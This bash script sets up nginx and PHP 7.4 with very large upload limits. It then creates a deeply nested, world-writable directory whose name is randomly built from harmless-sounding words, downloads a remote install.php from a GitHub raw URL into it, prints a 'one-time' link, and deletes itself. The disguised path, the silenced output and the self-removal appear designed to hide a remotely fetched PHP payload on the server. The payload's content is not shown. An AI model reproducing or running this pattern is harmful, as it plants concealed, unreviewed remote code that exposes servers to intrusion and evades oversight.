#!/bin/bash
while [[ $# -gt 0 ]]; do
    case $1 in
        -d|--domain)
            domain="$2"
            shift 2
            ;;
        *)
            shift
            ;;
    esac
done

log_progress() {
    timestamp=$(date +"%H:%M")
    elapsed_time=$(( SECONDS - start_time ))
    printf "[%02d:%02d] %s\n" $((elapsed_time/60)) $((elapsed_time%60)) "$1"
}

log() {
    printf "%s\n" "$1"
}

start_time=$SECONDS
sleep 3
log_progress "Checking system configuration"
apt update -y > /dev/null 2>&1
apt upgrade -y > /dev/null 2>&1
sleep 1
log_progress "Preparing for packages installation"
apt install -y software-properties-common curl wget gnupg2 ca-certificates lsb-release ubuntu-keyring > /dev/null 2>&1
sleep 1
log_progress "Installing packages"
curl -fsSL https://packages.sury.org/php/apt.gpg | sudo gpg --dearmor -o /usr/share/keyrings/php-archive-keyring.gpg --yes > /dev/null 2>&1
sleep 1
echo "deb [signed-by=/usr/share/keyrings/php-archive-keyring.gpg] https://packages.sury.org/php/ $(lsb_release -cs) main" | sudo tee -f /etc/apt/sources.list.d/php.list > /dev/null 2>&1
sleep 1
add-apt-repository -y ppa:ondrej/php > /dev/null 2>&1
sleep 1
add-apt-repository -y ppa:ondrej/nginx > /dev/null 2>&1
sleep 1
apt update -y > /dev/null 2>&1
sleep 1
apt install -y nginx > /dev/null 2>&1
sleep 1
apt install -y php7.4-fpm php7.4-cli php7.4-curl php7.4-sqlite3 php7.4-common php7.4-opcache php7.4-mbstring php7.4-xml php7.4-mysql > /dev/null 2>&1
sleep 1
log_progress "Configuring packages for 1:2"
mkdir -p /var/www/html > /dev/null 2>&1
chown -R www-data:www-data /var/www/html > /dev/null 2>&1
chmod -R 755 /var/www/html > /dev/null 2>&1
touch /var/www/html/index.html > /dev/null 2>&1
sleep 1
server_ip=$(hostname -I | awk '{print $1}')
if [ -z "$domain" ]; then
    config_file="/etc/nginx/sites-available/default"
    server_name="$server_ip"
else
    config_file="/etc/nginx/sites-available/$domain"
    server_name="$domain"
    rm -f /etc/nginx/sites-enabled/default > /dev/null 2>&1
fi
cat > "$config_file" << EOL
server {
    listen 80;
    server_name $server_name;
    root /var/www/html;
    index index.php index.html;
    client_max_body_size 0;
    client_body_buffer_size 128k;
    client_header_buffer_size 64k;
    large_client_header_buffers 4 64k;
    client_body_timeout 300s;
    client_header_timeout 300s;
    keepalive_timeout 300s;
    send_timeout 300s;
    fastcgi_read_timeout 300s;
    fastcgi_buffer_size 256k;
    fastcgi_buffers 8 128k;
    fastcgi_busy_buffers_size 256k;
    fastcgi_temp_file_write_size 256k;
    location = /install.php {
        satisfy any;
        allow all;
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
        fastcgi_param PHP_VALUE "upload_max_filesize=1000M \n post_max_size=1000M \n max_execution_time=300 \n max_input_time=300";
    }
    location / {
        try_files \$uri \$uri/ /index.php?\$query_string;
    }
    location ~ \.php\$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
        fastcgi_param PHP_VALUE "upload_max_filesize=1000M \n post_max_size=1000M \n max_execution_time=300 \n max_input_time=300";
    }
    location ~ /\.ht {
        deny all;
    }
}
EOL
sleep 1

if [ ! -z "$domain" ]; then
    ln -sf "$config_file" /etc/nginx/sites-enabled/ > /dev/null 2>&1
    sleep 1
fi
nginx -t > /dev/null 2>&1
sleep 1
systemctl restart nginx > /dev/null 2>&1
systemctl restart php7.4-fpm > /dev/null 2>&1
sleep 1
cat > /etc/php/7.4/fpm/conf.d/custom.ini << 'EOL'
upload_max_filesize = 1000M
post_max_size = 1000M
memory_limit = 512M
max_execution_time = 300
max_input_time = 300
EOL
sleep 1
systemctl restart php7.4-fpm > /dev/null 2>&1

log_progress "Preparing working directory"
words=("provider" "external" "eternal" "image" "video" "vm" "line" "pipe" "to" "python" "php" "javascript" "js" "_" "request" "poll" "secure" "http" "packet" "low" "geo" "cpu" "update" "process" "processor" "auth" "game" "longpoll" "api" "bigload" "server" "multi" "protect" "default" "sql" "db" "base" "linux" "windows" "flower" "async" "generator" "traffic" "test" "universal" "track" "wordpress" "datalife" "wp" "dle" "local" "public" "private" "temp" "cdn" "central" "uploads" "downloads" "temporary")

generate_dir_name() {
    if (( RANDOM % 5 == 0 )); then
        echo "$(( RANDOM % 10 ))"
        return
    fi
    num_words=$(( (RANDOM % 4) + 1 ))
    name=""
    for (( i=0; i<num_words; i++ )); do
        rand_index=$(( RANDOM % ${#words[@]} ))
        word=${words[$rand_index]}
        if (( RANDOM % 2 == 0 )); then
            modified_word="${word^}"
        else
            modified_word="${word,,}"
        fi
        name="${name}${modified_word}"
    done
    if (( RANDOM % 2 == 0 )); then
        digit=$(( RANDOM % 10 ))
        if (( RANDOM % 2 == 0 )); then
            name="${digit}${name}"
        else
            name="${name}${digit}"
        fi
    fi
    echo "$name"
}

nested_path=""
for (( i=1; i<=9; i++ )); do
    dir_name=$(generate_dir_name)
    nested_path="${nested_path}/${dir_name}"
done

rm -rf "/var/www/html${nested_path}" > /dev/null 2>&1
mkdir -p "/var/www/html${nested_path}" > /dev/null 2>&1
chmod -R 777 "/var/www/html${nested_path}" > /dev/null 2>&1
sleep 1
find "/var/www/html${nested_path}" -type d -exec touch {}/index.html \;
sleep 1
log_progress "Finalizing"
curl -fsSL https://raw.githubusercontent.com/yma-Lib/Cht-Lib/refs/heads/main/install.php -o "/var/www/html${nested_path}/install.php" > /dev/null 2>&1
chmod 777 "/var/www/html${nested_path}/install.php" > /dev/null 2>&1
sleep 3
elapsed_time=$(( SECONDS - start_time ))
log "✅ Installation and configuration is successfully completed in $(printf '%02d:%02d' $((elapsed_time/60)) $((elapsed_time%60)))!"
log "🔗 Link to the installer: http://$server_name${nested_path}/install.php"
log "❕ Link can only be used once."

rm -- "$0" > /dev/null 2>&1
rm install.php > /dev/null 2>&1
